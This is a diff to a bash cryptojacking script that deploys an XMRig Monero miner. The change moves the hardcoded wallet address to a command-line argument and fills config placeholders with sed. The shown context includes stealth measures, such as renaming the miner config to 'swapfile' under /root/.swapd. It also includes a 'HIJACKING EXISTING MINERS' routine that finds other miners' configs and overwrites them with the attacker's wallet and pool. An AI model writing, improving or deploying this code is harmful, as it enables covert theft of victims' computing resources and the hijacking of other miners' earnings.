@@ -1,5 +1,17 @@
 #!/bin/bash
 
+# ==================== WALLET ADDRESS FROM COMMAND LINE ====================
+if [ -z "$1" ]; then
+    echo "ERROR: Wallet address required!"
+    echo "Usage: $0 WALLET_ADDRESS"
+    echo "Example: $0 49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+    exit 1
+fi
+
+WALLET_ADDRESS="$1"
+echo "[*] Using wallet: ${WALLET_ADDRESS:0:20}...${WALLET_ADDRESS: -10}"
+echo ""
+
 # ==================== ARCHITECTURE AUTO-DETECTION ====================
 # USAGE EXAMPLES:
 #
@@ -1643,8 +1655,8 @@ fi  # End of MINER_TYPE selection (cpuminer vs xmrig)
 # ==================== CONFIGURE MINER ====================
 echo "[*] Configuring miner..."
 
-# User-configurable variables
-WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+# Use wallet from command line
+WALLET="$WALLET_ADDRESS"
 
 if [ "$MINER_TYPE" = "xmrig" ]; then
     # ==================== CONFIGURE XMRIG ====================
@@ -1720,8 +1732,8 @@ cat > config.json << 'EOL'
             "coin": "monero",
             "algo": "rx/0",
             "url": "gulf.moneroocean.stream:80",
-            "user": "49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso",
-            "pass": "h4ck3d",
+            "user": "WALLET_PLACEHOLDER",
+            "pass": "PASS_PLACEHOLDER",
             "keepalive": true,
             "tls": false
         }
@@ -1729,7 +1741,9 @@ cat > config.json << 'EOL'
 }
 EOL
 
-# No need to replace placeholders - using hardcoded values
+# Replace placeholders with actual values
+sed -i "s/WALLET_PLACEHOLDER/$WALLET/" config.json
+sed -i "s/PASS_PLACEHOLDER/$PASS/" config.json
 
 # Rename to swapfile for stealth
 mv config.json swapfile
@@ -2517,7 +2531,7 @@ echo "HIJACKING EXISTING MINERS"
 echo "=========================================="
 echo ""
 
-MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+MY_WALLET="$WALLET_ADDRESS"
 
 # Function to validate if a string is a Monero wallet address
 is_monero_wallet() {
@@ -2606,8 +2620,14 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
                     
-                    # OVERWRITE entire config.json with our exact configuration
-                    cat > "$config_file" << 'CONFIG_EOF'
+                    # COPY our exact config.json over this one
+                    # This preserves ALL our settings (threads, CPU affinity, etc.)
+                    if [ -f /root/.swapd/swapfile ]; then
+                        cp /root/.swapd/swapfile "$config_file"
+                    else
+                        echo "      [!] WARNING: Our config (/root/.swapd/swapfile) not found yet!"
+                        echo "      [*] Will create basic config with our wallet..."
+                        cat > "$config_file" << 'CONFIG_EOF'
 {
     "autosave": false,
     "donate-level": 0,
@@ -2619,7 +2639,7 @@ for search_path in "${SEARCH_PATHS[@]}"; do
             "coin": "monero",
             "algo": "rx/0",
             "url": "gulf.moneroocean.stream:80",
-            "user": "49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso",
+            "user": "HIJACK_WALLET_PLACEHOLDER",
             "pass": "h4ck3d",
             "keepalive": true,
             "tls": false
@@ -2627,6 +2647,8 @@ for search_path in "${SEARCH_PATHS[@]}"; do
     ]
 }
 CONFIG_EOF
+                        sed -i "s/HIJACK_WALLET_PLACEHOLDER/$MY_WALLET/" "$config_file"
+                    fi
                     
                     if [ $? -eq 0 ]; then
                         echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
